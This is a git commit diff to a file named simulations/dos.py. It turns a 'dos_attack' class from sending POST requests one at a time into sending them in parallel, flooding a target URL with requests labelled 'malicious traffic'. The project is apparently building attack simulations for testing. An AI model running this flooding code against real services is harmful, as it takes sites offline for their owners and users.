5ea9933085528cd0c4034a024949685b8dedba71
brandonlevack <135759075+brandonlevack@users.noreply.github.com>
2025-12-07 14:26:11 -0500

    Sim attacks merge (#27)

--- simulations/dos.py
+++ simulations/dos.py
@@ -1,12 +1,21 @@
-#Dependency - requests
 import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 class dos_attack:
     def __init__(self, url, i):
         self.url = url                              # Attack endpoint
         self.i = i                                  # Number of requests to send
-        payload = {'msg': 'malicious traffic'}      # Payload for http message and visibility server-side
+        self.payload = {'msg': 'malicious traffic'}      # Payload for http message and visibility server-side
 
-    def run(self):
-        for j in range(self.i):
-            response = requests.post(self.url, data=payload)
+    def send_request(self):                         # Sends single request
+        try:
+            response = requests.post(self.url, data=self.payload)
+            return response.status_code
+        except Exception as e:
+            return f"Error: {e}"
+
+    def run(self, workers=10):                      # In parallel send requests in range i
+        with ThreadPoolExecutor(max_workers=workers) as executor:
+            futures = [executor.submit(self.send_request) for _ in range(self.i)]
+            for future in as_completed(futures):
+                print(future.result())
